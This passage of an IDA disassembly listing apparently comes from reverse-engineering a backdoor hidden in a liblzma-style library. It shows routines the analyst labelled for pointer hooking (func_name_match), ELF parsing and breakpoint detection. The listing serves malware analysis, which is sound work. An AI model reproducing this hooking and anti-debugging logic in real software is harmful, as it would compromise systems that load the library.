.text.microlzma_decoder_inia:00000000000028BB _text_microlzma_decoder_inia ends
.text.microlzma_decoder_inia:00000000000028BB
.text.lz_encoder_prepara:00000000000028C0 ; ===========================================================================
.text.lz_encoder_prepara:00000000000028C0
.text.lz_encoder_prepara:00000000000028C0 ; Segment type: Pure code
.text.lz_encoder_prepara:00000000000028C0 ; Segment permissions: Read/Execute
.text.lz_encoder_prepara:00000000000028C0 _text_lz_encoder_prepara segment para public 'CODE' use64
.text.lz_encoder_prepara:00000000000028C0                 assume cs:_text_lz_encoder_prepara
.text.lz_encoder_prepara:00000000000028C0                 ;org 28C0h
.text.lz_encoder_prepara:00000000000028C0                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lz_encoder_prepara:00000000000028C0
.text.lz_encoder_prepara:00000000000028C0 ; =============== S U B R O U T I N E =======================================
.text.lz_encoder_prepara:00000000000028C0
.text.lz_encoder_prepara:00000000000028C0
.text.lz_encoder_prepara:00000000000028C0 ; __int64 __fastcall func_name_match(unsigned __int64, __int64, __int64, __int64, __int64, char *)
.text.lz_encoder_prepara:00000000000028C0                 public func_name_match
.text.lz_encoder_prepara:00000000000028C0 func_name_match proc near               ; DATA XREF: backdoor_vtbl_init+22↑o
.text.lz_encoder_prepara:00000000000028C0                 endbr64
.text.lz_encoder_prepara:00000000000028C4                 push    r15
.text.lz_encoder_prepara:00000000000028C6                 push    r14
.text.lz_encoder_prepara:00000000000028C8                 push    r13
.text.lz_encoder_prepara:00000000000028CA                 push    r12
.text.lz_encoder_prepara:00000000000028CC                 mov     r12, cs:_Lfilter_options_0
.text.lz_encoder_prepara:00000000000028D3                 push    rbx
.text.lz_encoder_prepara:00000000000028D4                 mov     rbx, rdi
.text.lz_encoder_prepara:00000000000028D7                 cmp     dword ptr [r12+130h], 0
.text.lz_encoder_prepara:00000000000028E0                 mov     r13, [r12+128h]
.text.lz_encoder_prepara:00000000000028E8                 jnz     loc_2A24
.text.lz_encoder_prepara:00000000000028EE                 mov     rdx, offset global_ctx
.text.lz_encoder_prepara:00000000000028F5                 mov     r14, [rsp+28h]
.text.lz_encoder_prepara:00000000000028FA                 mov     rax, [r12+100h]
.text.lz_encoder_prepara:0000000000002902                 mov     rdx, [rdx]
.text.lz_encoder_prepara:0000000000002905                 mov     rdx, [rdx+10h]
.text.lz_encoder_prepara:0000000000002909                 mov     r15, [rdx+68h]
.text.lz_encoder_prepara:000000000000290D                 cmp     rax, r14
.text.lz_encoder_prepara:0000000000002910                 jnb     loc_2A18
.text.lz_encoder_prepara:0000000000002916                 mov     rdx, r14
.text.lz_encoder_prepara:0000000000002919                 sub     rdx, rax
.text.lz_encoder_prepara:000000000000291C                 add     rax, [r12+108h]
.text.lz_encoder_prepara:0000000000002924                 cmp     rax, rdx
.text.lz_encoder_prepara:0000000000002927                 jb      loc_2A18
.text.lz_encoder_prepara:000000000000292D                 mov     rdi, r9         ; _BYTE *
.text.lz_encoder_prepara:0000000000002930                 xor     esi, esi        ; unsigned __int64
.text.lz_encoder_prepara:0000000000002932                 call    table_get       ; PIC mode
.text.lz_encoder_prepara:0000000000002937                 mov     rdx, [r13+18h]
.text.lz_encoder_prepara:000000000000293B                 cmp     eax, 1D0h
.text.lz_encoder_prepara:0000000000002940                 jnz     short loc_2980
.text.lz_encoder_prepara:0000000000002942                 test    rdx, rdx
.text.lz_encoder_prepara:0000000000002945                 jz      short loc_2980
.text.lz_encoder_prepara:0000000000002947                 mov     rax, [rdx]
.text.lz_encoder_prepara:000000000000294A                 cmp     rax, 0FFFFFFh
.text.lz_encoder_prepara:0000000000002950                 jbe     loc_2A10
.text.lz_encoder_prepara:0000000000002956                 mov     [r13+0], rax
.text.lz_encoder_prepara:000000000000295A                 mov     rax, [r12+110h]
.text.lz_encoder_prepara:0000000000002962                 mov     [rdx], rax
.text.lz_encoder_prepara:0000000000002965                 cmp     rbx, r14
.text.lz_encoder_prepara:0000000000002968                 jbe     loc_2A10
.text.lz_encoder_prepara:000000000000296E                 cmp     rbx, r15
.text.lz_encoder_prepara:0000000000002971                 jnb     loc_2A10
.text.lz_encoder_prepara:0000000000002977                 mov     [rbx+8], rax
.text.lz_encoder_prepara:000000000000297B                 jmp     loc_2A10
.text.lz_encoder_prepara:0000000000002980 ; ---------------------------------------------------------------------------
.text.lz_encoder_prepara:0000000000002980
.text.lz_encoder_prepara:0000000000002980 loc_2980:                               ; CODE XREF: func_name_match+80↑j
.text.lz_encoder_prepara:0000000000002980                                         ; func_name_match+85↑j
.text.lz_encoder_prepara:0000000000002980                 mov     rdx, [r13+20h]
.text.lz_encoder_prepara:0000000000002984                 test    rdx, rdx
.text.lz_encoder_prepara:0000000000002987                 jz      short loc_29CA
.text.lz_encoder_prepara:0000000000002989                 cmp     eax, 510h
.text.lz_encoder_prepara:000000000000298E                 jnz     short loc_29CA
.text.lz_encoder_prepara:0000000000002990                 mov     rax, [rdx]
.text.lz_encoder_prepara:0000000000002993                 cmp     rax, 0FFFFFFh
.text.lz_encoder_prepara:0000000000002999                 jbe     short loc_2A10
.text.lz_encoder_prepara:000000000000299B                 mov     [r13+8], rax
.text.lz_encoder_prepara:000000000000299F                 mov     rax, [r12+118h]
.text.lz_encoder_prepara:00000000000029A7                 mov     [rdx], rax
.text.lz_encoder_prepara:00000000000029AA                 cmp     rbx, r14
.text.lz_encoder_prepara:00000000000029AD                 jbe     short loc_29B8
.text.lz_encoder_prepara:00000000000029AF                 cmp     rbx, r15
.text.lz_encoder_prepara:00000000000029B2                 jnb     short loc_29B8
.text.lz_encoder_prepara:00000000000029B4                 mov     [rbx+8], rax
.text.lz_encoder_prepara:00000000000029B8
.text.lz_encoder_prepara:00000000000029B8 loc_29B8:                               ; CODE XREF: func_name_match+ED↑j
.text.lz_encoder_prepara:00000000000029B8                                         ; func_name_match+F2↑j
.text.lz_encoder_prepara:00000000000029B8                 mov     rax, [r13+28h]
.text.lz_encoder_prepara:00000000000029BC                 test    rax, rax
.text.lz_encoder_prepara:00000000000029BF                 jz      short loc_2A10
.text.lz_encoder_prepara:00000000000029C1                 cmp     qword ptr [rax], 0FFFFFFh
.text.lz_encoder_prepara:00000000000029C8                 jmp     short loc_2A0E
.text.lz_encoder_prepara:00000000000029CA ; ---------------------------------------------------------------------------
.text.lz_encoder_prepara:00000000000029CA
.text.lz_encoder_prepara:00000000000029CA loc_29CA:                               ; CODE XREF: func_name_match+C7↑j
.text.lz_encoder_prepara:00000000000029CA                                         ; func_name_match+CE↑j
.text.lz_encoder_prepara:00000000000029CA                 mov     rcx, [r13+28h]
.text.lz_encoder_prepara:00000000000029CE                 cmp     eax, 798h
.text.lz_encoder_prepara:00000000000029D3                 jnz     short loc_2A24
.text.lz_encoder_prepara:00000000000029D5                 test    rcx, rcx
.text.lz_encoder_prepara:00000000000029D8                 jz      short loc_2A24
.text.lz_encoder_prepara:00000000000029DA                 mov     rax, [rcx]
.text.lz_encoder_prepara:00000000000029DD                 cmp     rax, 0FFFFFFh
.text.lz_encoder_prepara:00000000000029E3                 jbe     short loc_2A10
.text.lz_encoder_prepara:00000000000029E5                 mov     [r13+10h], rax
.text.lz_encoder_prepara:00000000000029E9                 mov     rax, [r12+120h]
.text.lz_encoder_prepara:00000000000029F1                 mov     [rcx], rax
.text.lz_encoder_prepara:00000000000029F4                 cmp     rbx, r14
.text.lz_encoder_prepara:00000000000029F7                 jbe     short loc_2A02
.text.lz_encoder_prepara:00000000000029F9                 cmp     rbx, r15
.text.lz_encoder_prepara:00000000000029FC                 jnb     short loc_2A02
.text.lz_encoder_prepara:00000000000029FE                 mov     [rbx+8], rax
.text.lz_encoder_prepara:0000000000002A02
.text.lz_encoder_prepara:0000000000002A02 loc_2A02:                               ; CODE XREF: func_name_match+137↑j
.text.lz_encoder_prepara:0000000000002A02                                         ; func_name_match+13C↑j
.text.lz_encoder_prepara:0000000000002A02                 test    rdx, rdx
.text.lz_encoder_prepara:0000000000002A05                 jz      short loc_2A10
.text.lz_encoder_prepara:0000000000002A07                 cmp     qword ptr [rdx], 0FFFFFFh
.text.lz_encoder_prepara:0000000000002A0E
.text.lz_encoder_prepara:0000000000002A0E loc_2A0E:                               ; CODE XREF: func_name_match+108↑j
.text.lz_encoder_prepara:0000000000002A0E                 jbe     short loc_2A24
.text.lz_encoder_prepara:0000000000002A10
.text.lz_encoder_prepara:0000000000002A10 loc_2A10:                               ; CODE XREF: func_name_match+90↑j
.text.lz_encoder_prepara:0000000000002A10                                         ; func_name_match+A8↑j ...
.text.lz_encoder_prepara:0000000000002A10                 mov     rdi, r12
.text.lz_encoder_prepara:0000000000002A13                 call    sub_2760
.text.lz_encoder_prepara:0000000000002A18
.text.lz_encoder_prepara:0000000000002A18 loc_2A18:                               ; CODE XREF: func_name_match+50↑j
.text.lz_encoder_prepara:0000000000002A18                                         ; func_name_match+67↑j
.text.lz_encoder_prepara:0000000000002A18                 mov     dword ptr [r12+130h], 1
.text.lz_encoder_prepara:0000000000002A24
.text.lz_encoder_prepara:0000000000002A24 loc_2A24:                               ; CODE XREF: func_name_match+28↑j
.text.lz_encoder_prepara:0000000000002A24                                         ; func_name_match+113↑j ...
.text.lz_encoder_prepara:0000000000002A24                 mov     rax, [rbx+8]
.text.lz_encoder_prepara:0000000000002A28                 pop     rbx
.text.lz_encoder_prepara:0000000000002A29                 pop     r12
.text.lz_encoder_prepara:0000000000002A2B                 pop     r13
.text.lz_encoder_prepara:0000000000002A2D                 pop     r14
.text.lz_encoder_prepara:0000000000002A2F                 pop     r15
.text.lz_encoder_prepara:0000000000002A31                 retn
.text.lz_encoder_prepara:0000000000002A31 func_name_match endp
.text.lz_encoder_prepara:0000000000002A31
.text.lz_encoder_prepara:0000000000002A31 _text_lz_encoder_prepara ends
.text.lz_encoder_prepara:0000000000002A31
.text.reverse_seez:0000000000002A40 ; ===========================================================================
.text.reverse_seez:0000000000002A40
.text.reverse_seez:0000000000002A40 ; Segment type: Pure code
.text.reverse_seez:0000000000002A40 ; Segment permissions: Read/Execute
.text.reverse_seez:0000000000002A40 _text_reverse_seez segment para public 'CODE' use64
.text.reverse_seez:0000000000002A40                 assume cs:_text_reverse_seez
.text.reverse_seez:0000000000002A40                 ;org 2A40h
.text.reverse_seez:0000000000002A40                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.reverse_seez:0000000000002A40
.text.reverse_seez:0000000000002A40 ; =============== S U B R O U T I N E =======================================
.text.reverse_seez:0000000000002A40
.text.reverse_seez:0000000000002A40
.text.reverse_seez:0000000000002A40 ; _BOOL8 __fastcall sub_2A40(unsigned int, _DWORD **, _QWORD *, __int64 *, __int64 *, __int64, _DWORD *)
.text.reverse_seez:0000000000002A40 sub_2A40        proc near               ; CODE XREF: parse_elf_init+953↓p
.text.reverse_seez:0000000000002A40                                         ; parse_elf_init+9C4↓p ...
.text.reverse_seez:0000000000002A40
.text.reverse_seez:0000000000002A40 arg_0           = qword ptr  8
.text.reverse_seez:0000000000002A40
.text.reverse_seez:0000000000002A40                 mov     edi, edi
.text.reverse_seez:0000000000002A42                 mov     rax, rdx
.text.reverse_seez:0000000000002A45                 shl     rdi, 5
.text.reverse_seez:0000000000002A49                 add     r9, rdi
.text.reverse_seez:0000000000002A4C                 mov     rdx, [r9+8]
.text.reverse_seez:0000000000002A50                 test    rdx, rdx
.text.reverse_seez:0000000000002A53                 jz      loc_2AF9
.text.reverse_seez:0000000000002A59                 push    r13
.text.reverse_seez:0000000000002A5B                 mov     r13, r8
.text.reverse_seez:0000000000002A5E                 xor     r8d, r8d
.text.reverse_seez:0000000000002A61                 push    r12
.text.reverse_seez:0000000000002A63                 mov     rdi, r13
.text.reverse_seez:0000000000002A66                 mov     r12, rcx
.text.reverse_seez:0000000000002A69                 xor     ecx, ecx
.text.reverse_seez:0000000000002A6B                 push    rbx
.text.reverse_seez:0000000000002A6C                 mov     rbx, rsi
.text.reverse_seez:0000000000002A6F                 mov     [rsi], rdx
.text.reverse_seez:0000000000002A72                 mov     rdx, [r9+10h]
.text.reverse_seez:0000000000002A76                 mov     [rax], rdx
.text.reverse_seez:0000000000002A79                 mov     rsi, [rsi]
.text.reverse_seez:0000000000002A7C                 xor     edx, edx
.text.reverse_seez:0000000000002A7E                 call    _Lstream_encoder_update_0 ; PIC mode
.text.reverse_seez:0000000000002A83                 mov     [r12], rax
.text.reverse_seez:0000000000002A87                 test    rax, rax
.text.reverse_seez:0000000000002A8A                 jz      short loc_2AAE
.text.reverse_seez:0000000000002A8C
.text.reverse_seez:0000000000002A8C loc_2A8C:                               ; CODE XREF: sub_2A40+87↓j
.text.reverse_seez:0000000000002A8C                 mov     rsi, [r12]
.text.reverse_seez:0000000000002A90                 mov     ecx, 1
.text.reverse_seez:0000000000002A95                 mov     edx, 10h
.text.reverse_seez:0000000000002A9A                 mov     rdi, r13
.text.reverse_seez:0000000000002A9D                 sub     rsi, 8
.text.reverse_seez:0000000000002AA1                 call    _Lauto_decode_1 ; PIC mode
.text.reverse_seez:0000000000002AA6                 test    eax, eax
.text.reverse_seez:0000000000002AA8                 jnz     short loc_2ACB
.text.reverse_seez:0000000000002AAA
.text.reverse_seez:0000000000002AAA loc_2AAA:                               ; CODE XREF: sub_2A40+89↓j
.text.reverse_seez:0000000000002AAA                 xor     eax, eax
.text.reverse_seez:0000000000002AAC                 jmp     short loc_2AF3
.text.reverse_seez:0000000000002AAE ; ---------------------------------------------------------------------------
.text.reverse_seez:0000000000002AAE
.text.reverse_seez:0000000000002AAE loc_2AAE:                               ; CODE XREF: sub_2A40+4A↑j
.text.reverse_seez:0000000000002AAE                 mov     rsi, [rbx]
.text.reverse_seez:0000000000002AB1                 xor     r8d, r8d
.text.reverse_seez:0000000000002AB4                 xor     ecx, ecx
.text.reverse_seez:0000000000002AB6                 xor     edx, edx
.text.reverse_seez:0000000000002AB8                 mov     rdi, r13
.text.reverse_seez:0000000000002ABB                 call    _Lstream_encoder_update_1 ; PIC mode
.text.reverse_seez:0000000000002AC0                 mov     [r12], rax
.text.reverse_seez:0000000000002AC4                 test    rax, rax
.text.reverse_seez:0000000000002AC7                 jnz     short loc_2A8C
.text.reverse_seez:0000000000002AC9                 jmp     short loc_2AAA
.text.reverse_seez:0000000000002ACB ; ---------------------------------------------------------------------------
.text.reverse_seez:0000000000002ACB
.text.reverse_seez:0000000000002ACB loc_2ACB:                               ; CODE XREF: sub_2A40+68↑j
.text.reverse_seez:0000000000002ACB                 mov     rdx, [rsp+18h+arg_0]
.text.reverse_seez:0000000000002AD0                 mov     eax, 1
.text.reverse_seez:0000000000002AD5                 cmp     dword ptr [rdx], 0
.text.reverse_seez:0000000000002AD8                 jz      short loc_2AF3
.text.reverse_seez:0000000000002ADA                 mov     rdi, [rbx]
.text.reverse_seez:0000000000002ADD                 mov     edx, 0E230h
.text.reverse_seez:0000000000002AE2                 lea     rsi, [rdi+4]
.text.reverse_seez:0000000000002AE6                 call    check_software_breakpoint ; PIC mode
.text.reverse_seez:0000000000002AEB                 test    eax, eax
.text.reverse_seez:0000000000002AED                 setnz   al
.text.reverse_seez:0000000000002AF0                 movzx   eax, al
.text.reverse_seez:0000000000002AF3
.text.reverse_seez:0000000000002AF3 loc_2AF3:                               ; CODE XREF: sub_2A40+6C↑j
.text.reverse_seez:0000000000002AF3                                         ; sub_2A40+98↑j
.text.reverse_seez:0000000000002AF3                 pop     rbx
.text.reverse_seez:0000000000002AF4                 pop     r12
.text.reverse_seez:0000000000002AF6                 pop     r13
.text.reverse_seez:0000000000002AF8                 retn
.text.reverse_seez:0000000000002AF9 ; ---------------------------------------------------------------------------
.text.reverse_seez:0000000000002AF9
.text.reverse_seez:0000000000002AF9 loc_2AF9:                               ; CODE XREF: sub_2A40+13↑j
.text.reverse_seez:0000000000002AF9                 xor     eax, eax
.text.reverse_seez:0000000000002AFB                 retn
.text.reverse_seez:0000000000002AFB sub_2A40        endp
.text.reverse_seez:0000000000002AFB
.text.reverse_seez:0000000000002AFB _text_reverse_seez ends
.text.reverse_seez:0000000000002AFB
.text.transfora:0000000000002B00 ; ===========================================================================
.text.transfora:0000000000002B00
.text.transfora:0000000000002B00 ; Segment type: Pure code
.text.transfora:0000000000002B00 ; Segment permissions: Read/Execute
.text.transfora:0000000000002B00 _text_transfora segment para public 'CODE' use64
.text.transfora:0000000000002B00                 assume cs:_text_transfora
.text.transfora:0000000000002B00                 ;org 2B00h
.text.transfora:0000000000002B00                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.transfora:0000000000002B00
.text.transfora:0000000000002B00 ; =============== S U B R O U T I N E =======================================
.text.transfora:0000000000002B00
.text.transfora:0000000000002B00
.text.transfora:0000000000002B00 ; _BOOL8 __fastcall sub_2B00(unsigned __int64, unsigned __int64, _DWORD *, unsigned __int64, _QWORD *, int *)
.text.transfora:0000000000002B00 sub_2B00        proc near               ; CODE XREF: parse_elf_init+1344↓p
.text.transfora:0000000000002B00
.text.transfora:0000000000002B00 var_A0          = qword ptr -0A0h
.text.transfora:0000000000002B00 var_98          = qword ptr -98h
.text.transfora:0000000000002B00 var_90          = qword ptr -90h
.text.transfora:0000000000002B00 var_88          = qword ptr -88h
.text.transfora:0000000000002B00 var_80          = qword ptr -80h
.text.transfora:0000000000002B00 var_78          = qword ptr -78h
.text.transfora:0000000000002B00 var_58          = dword ptr -58h
.text.transfora:0000000000002B00 var_48          = qword ptr -48h
.text.transfora:0000000000002B00
.text.transfora:0000000000002B00                 push    r15
.text.transfora:0000000000002B02                 xor     eax, eax
.text.transfora:0000000000002B04                 push    r14
.text.transfora:0000000000002B06                 push    r13
.text.transfora:0000000000002B08                 mov     r13, rdi
.text.transfora:0000000000002B0B                 push    r12
.text.transfora:0000000000002B0D                 push    rbx
.text.transfora:0000000000002B0E                 add     rsp, 0FFFFFFFFFFFFFF80h
.text.transfora:0000000000002B12                 cmp     r13, rsi
.text.transfora:0000000000002B15                 mov     [rsp+0A8h+var_90], rcx
.text.transfora:0000000000002B1A                 lea     rdi, [rsp+0A8h+var_80]
.text.transfora:0000000000002B1F                 mov     ecx, 16h
.text.transfora:0000000000002B24                 rep stosd
.text.transfora:0000000000002B26                 setz    al
.text.transfora:0000000000002B29                 test    r13, r13
.text.transfora:0000000000002B2C                 mov     [rsp+0A8h+var_98], rdx
.text.transfora:0000000000002B31                 setz    dl
.text.transfora:0000000000002B34                 or      al, dl
.text.transfora:0000000000002B36                 lea     rax, [rsp+0A8h+var_80]
.text.transfora:0000000000002B3B                 mov     [rsp+0A8h+var_A0], rax
.text.transfora:0000000000002B40                 jnz     short loc_2B4A
.text.transfora:0000000000002B42                 mov     r12, rsi
.text.transfora:0000000000002B45                 test    rsi, rsi
.text.transfora:0000000000002B48                 jnz     short loc_2B51
.text.transfora:0000000000002B4A
.text.transfora:0000000000002B4A loc_2B4A:                               ; CODE XREF: sub_2B00+40↑j
.text.transfora:0000000000002B4A                                         ; sub_2B00+69↓j ...
.text.transfora:0000000000002B4A                 xor     eax, eax
.text.transfora:0000000000002B4C                 jmp     loc_2C34
.text.transfora:0000000000002B51 ; ---------------------------------------------------------------------------
.text.transfora:0000000000002B51
.text.transfora:0000000000002B51 loc_2B51:                               ; CODE XREF: sub_2B00+48↑j
.text.transfora:0000000000002B51                 mov     rax, rsi
.text.transfora:0000000000002B54                 mov     r15, r9
.text.transfora:0000000000002B57                 sub     rax, r13
.text.transfora:0000000000002B5A                 cmp     r13, rsi
.text.transfora:0000000000002B5D                 jb      short loc_2B65
.text.transfora:0000000000002B5F                 mov     rax, r13
.text.transfora:0000000000002B62                 sub     rax, rsi
.text.transfora:0000000000002B65
.text.transfora:0000000000002B65 loc_2B65:                               ; CODE XREF: sub_2B00+5D↑j
.text.transfora:0000000000002B65                 cmp     rax, 0Fh
.text.transfora:0000000000002B69                 jg      short loc_2B4A
.text.transfora:0000000000002B6B                 mov     rcx, [r8+268h]
.text.transfora:0000000000002B72                 test    rcx, rcx
.text.transfora:0000000000002B75                 jz      short loc_2B4A
.text.transfora:0000000000002B77                 mov     rdi, [r8+288h]
.text.transfora:0000000000002B7E                 test    rdi, rdi
.text.transfora:0000000000002B81                 jz      short loc_2B4A
.text.transfora:0000000000002B83                 mov     r14, [r8+290h]
.text.transfora:0000000000002B8A                 mov     rdx, [rsp+0A8h+var_A0]
.text.transfora:0000000000002B8F                 mov     rsi, r14
.text.transfora:0000000000002B92                 call    _Llzma_mt_block_size_1 ; PIC mode
.text.transfora:0000000000002B97                 test    eax, eax
.text.transfora:0000000000002B99                 jz      short loc_2B4A
.text.transfora:0000000000002B9B                 mov     rbx, [rsp+0A8h+var_80]
.text.transfora:0000000000002BA0                 mov     rsi, [rsp+0A8h+var_78]
.text.transfora:0000000000002BA5                 mov     rdx, r14
.text.transfora:0000000000002BA8                 mov     rdi, [rsp+0A8h+var_A0]
.text.transfora:0000000000002BAD                 add     rsi, rbx
.text.transfora:0000000000002BB0                 call    code_dasm       ; PIC mode
.text.transfora:0000000000002BB5                 test    eax, eax
.text.transfora:0000000000002BB7                 jz      short loc_2BFA
.text.transfora:0000000000002BB9                 cmp     [rsp+0A8h+var_58], 168h
.text.transfora:0000000000002BC1                 jnz     short loc_2BFA
.text.transfora:0000000000002BC3                 mov     rbx, [rsp+0A8h+var_78]
.text.transfora:0000000000002BC8                 mov     r9d, [r15]
.text.transfora:0000000000002BCB                 xor     eax, eax
.text.transfora:0000000000002BCD                 lea     rdx, [rsp+0A8h+var_88]
.text.transfora:0000000000002BD2                 add     rbx, [rsp+0A8h+var_48]
.text.transfora:0000000000002BD7                 mov     r8, [rsp+0A8h+var_90]
.text.transfora:0000000000002BDC                 xor     esi, esi
.text.transfora:0000000000002BDE                 mov     [rsp+0A8h+var_88], rax
.text.transfora:0000000000002BE3                 add     rbx, [rsp+0A8h+var_80]
.text.transfora:0000000000002BE8                 mov     rcx, [rsp+0A8h+var_98]
.text.transfora:0000000000002BED                 mov     rdi, rbx
.text.transfora:0000000000002BF0                 call    apply_method_1  ; PIC mode
.text.transfora:0000000000002BF5                 mov     r14, [rsp+0A8h+var_88]
.text.transfora:0000000000002BFA
.text.transfora:0000000000002BFA loc_2BFA:                               ; CODE XREF: sub_2B00+B7↑j
.text.transfora:0000000000002BFA                                         ; sub_2B00+C1↑j
.text.transfora:0000000000002BFA                 xor     edx, edx
.text.transfora:0000000000002BFC                 mov     r8, r13
.text.transfora:0000000000002BFF                 mov     ecx, 109h
.text.transfora:0000000000002C04                 mov     rsi, r14
.text.transfora:0000000000002C07                 mov     rdi, rbx
.text.transfora:0000000000002C0A                 call    _Llzma_properties_size_0 ; PIC mode
.text.transfora:0000000000002C0F                 test    eax, eax
.text.transfora:0000000000002C11                 jz      loc_2B4A
.text.transfora:0000000000002C17                 xor     edx, edx
.text.transfora:0000000000002C19                 mov     r8, r12
.text.transfora:0000000000002C1C                 mov     ecx, 109h
.text.transfora:0000000000002C21                 mov     rsi, r14
.text.transfora:0000000000002C24                 mov     rdi, rbx
.text.transfora:0000000000002C27                 call    _Llzma_properties_size_0 ; PIC mode
.text.transfora:0000000000002C2C                 test    eax, eax
.text.transfora:0000000000002C2E                 setnz   al
.text.transfora:0000000000002C31                 movzx   eax, al
.text.transfora:0000000000002C34
.text.transfora:0000000000002C34 loc_2C34:                               ; CODE XREF: sub_2B00+4C↑j
.text.transfora:0000000000002C34                 sub     rsp, 0FFFFFFFFFFFFFF80h
.text.transfora:0000000000002C38                 pop     rbx
.text.transfora:0000000000002C39                 pop     r12
.text.transfora:0000000000002C3B                 pop     r13
.text.transfora:0000000000002C3D                 pop     r14
.text.transfora:0000000000002C3F                 pop     r15
.text.transfora:0000000000002C41                 retn
.text.transfora:0000000000002C41 sub_2B00        endp
.text.transfora:0000000000002C41
.text.transfora:0000000000002C41 _text_transfora ends
.text.transfora:0000000000002C41
.text.lzma_next_filter_inia:0000000000002C50 ; ===========================================================================
.text.lzma_next_filter_inia:0000000000002C50
.text.lzma_next_filter_inia:0000000000002C50 ; Segment type: Pure code
.text.lzma_next_filter_inia:0000000000002C50 ; Segment permissions: Read/Execute
.text.lzma_next_filter_inia:0000000000002C50 _text_lzma_next_filter_inia segment para public 'CODE' use64
.text.lzma_next_filter_inia:0000000000002C50                 assume cs:_text_lzma_next_filter_inia
.text.lzma_next_filter_inia:0000000000002C50                 ;org 2C50h
.text.lzma_next_filter_inia:0000000000002C50                 assume es:nothing, ss:nothing, ds:_text, fs:nothing, gs:nothing
.text.lzma_next_filter_inia:0000000000002C50
.text.lzma_next_filter_inia:0000000000002C50 ; =============== S U B R O U T I N E =======================================
.text.lzma_next_filter_inia:0000000000002C50
.text.lzma_next_filter_inia:0000000000002C50
.text.lzma_next_filter_inia:0000000000002C50 ; unsigned __int64 __fastcall sub_2C50(unsigned int, __int64, unsigned __int64, __int64)
.text.lzma_next_filter_inia:0000000000002C50 sub_2C50        proc near               ; CODE XREF: parse_elf_init+C15↓p
.text.lzma_next_filter_inia:0000000000002C50                                         ; parse_elf_init+CC2↓p
.text.lzma_next_filter_inia:0000000000002C50
.text.lzma_next_filter_inia:0000000000002C50 var_80          = qword ptr -80h
.text.lzma_next_filter_inia:0000000000002C50 var_78          = qword ptr -78h
.text.lzma_next_filter_inia:0000000000002C50 var_6F          = byte ptr -6Fh
.text.lzma_next_filter_inia:0000000000002C50 var_65          = byte ptr -65h
.text.lzma_next_filter_inia:0000000000002C50 var_64          = dword ptr -64h
.text.lzma_next_filter_inia:0000000000002C50 var_50          = qword ptr -50h
.text.lzma_next_filter_inia:0000000000002C50
.text.lzma_next_filter_inia:0000000000002C50                 push    r15
.text.lzma_next_filter_inia:0000000000002C52                 mov     r8d, edi
.text.lzma_next_filter_inia:0000000000002C55                 xor     eax, eax
.text.lzma_next_filter_inia:0000000000002C57                 push    r14
.text.lzma_next_filter_inia:0000000000002C59                 shl     r8, 5
.text.lzma_next_filter_inia:0000000000002C5D                 push    r13
.text.lzma_next_filter_inia:0000000000002C5F                 push    r12
.text.lzma_next_filter_inia:0000000000002C61                 push    rbx
.text.lzma_next_filter_inia:0000000000002C62                 mov     rbx, rcx
.text.lzma_next_filter_inia:0000000000002C65                 mov     ecx, 16h
.text.lzma_next_filter_inia:0000000000002C6A                 sub     rsp, 60h
.text.lzma_next_filter_inia:0000000000002C6E                 lea     rdi, [rsp+88h+var_80]
.text.lzma_next_filter_inia:0000000000002C73                 rep stosd
.text.lzma_next_filter_inia:0000000000002C75                 lea     rax, [rsi+r8]
.text.lzma_next_filter_inia:0000000000002C79                 mov     r13, [rax+8]
.text.lzma_next_filter_inia:0000000000002C7D                 test    r13, r13
.text.lzma_next_filter_inia:0000000000002C80                 jnz     short loc_2C86
.text.lzma_next_filter_inia:0000000000002C82
.text.lzma_next_filter_inia:0000000000002C82 loc_2C82:                               ; CODE XREF: sub_2C50+49↓j
.text.lzma_next_filter_inia:0000000000002C82                                         ; sub_2C50+7A↓j
.text.lzma_next_filter_inia:0000000000002C82                 xor     eax, eax
.text.lzma_next_filter_inia:0000000000002C84                 jmp     short loc_2D05
.text.lzma_next_filter_inia:0000000000002C86 ; ---------------------------------------------------------------------------
.text.lzma_next_filter_inia:0000000000002C86
.text.lzma_next_filter_inia:0000000000002C86 loc_2C86:                               ; CODE XREF: sub_2C50+30↑j
.text.lzma_next_filter_inia:0000000000002C86                 mov     r15, [rax+10h]
.text.lzma_next_filter_inia:0000000000002C8A                 mov     r14, rdx
.text.lzma_next_filter_inia:0000000000002C8D                 lea     r12, [rsp+88h+var_80]
.text.lzma_next_filter_inia:0000000000002C92                 sub     rbx, 4
.text.lzma_next_filter_inia:0000000000002C96
.text.lzma_next_filter_inia:0000000000002C96 loc_2C96:                               ; CODE XREF: sub_2C50+AE↓j
.text.lzma_next_filter_inia:0000000000002C96                                         ; sub_2C50+B3↓j
.text.lzma_next_filter_inia:0000000000002C96                 cmp     r13, r15
.text.lzma_next_filter_inia:0000000000002C99                 jnb     short loc_2C82
.text.lzma_next_filter_inia:0000000000002C9B                 xor     r8d, r8d
.text.lzma_next_filter_inia:0000000000002C9E                 mov     ecx, 10Bh
.text.lzma_next_filter_inia:0000000000002CA3                 mov     rdx, r12
.text.lzma_next_filter_inia:0000000000002CA6                 mov     rsi, r15
.text.lzma_next_filter_inia:0000000000002CA9                 mov     rdi, r13
.text.lzma_next_filter_inia:0000000000002CAC                 call    _Llzma_properties_size_0 ; PIC mode
.text.lzma_next_filter_inia:0000000000002CB1                 test    eax, eax
.text.lzma_next_filter_inia:0000000000002CB3                 jz      short loc_2D00
.text.lzma_next_filter_inia:0000000000002CB5                 mov     al, [rsp+88h+var_65]
.text.lzma_next_filter_inia:0000000000002CB9                 and     eax, 48h
.text.lzma_next_filter_inia:0000000000002CBC                 cmp     al, 48h ; 'H'
.text.lzma_next_filter_inia:0000000000002CBE                 jz      short loc_2CF9
.text.lzma_next_filter_inia:0000000000002CC0                 test    [rsp+88h+var_6F], 1
.text.lzma_next_filter_inia:0000000000002CC5                 jnz     short loc_2CCE
.text.lzma_next_filter_inia:0000000000002CC7                 test    r14, r14
.text.lzma_next_filter_inia:0000000000002CCA                 jz      short loc_2C82
.text.lzma_next_filter_inia:0000000000002CCC                 jmp     short loc_2CF9
.text.lzma_next_filter_inia:0000000000002CCE ; ---------------------------------------------------------------------------
.text.lzma_next_filter_inia:0000000000002CCE
.text.lzma_next_filter_inia:0000000000002CCE loc_2CCE:                               ; CODE XREF: sub_2C50+75↑j
.text.lzma_next_filter_inia:0000000000002CCE                 mov     edx, [rsp+88h+var_64]
.text.lzma_next_filter_inia:0000000000002CD2                 mov     rax, [rsp+88h+var_50]
.text.lzma_next_filter_inia:0000000000002CD7                 and     edx, 0FF00FF00h
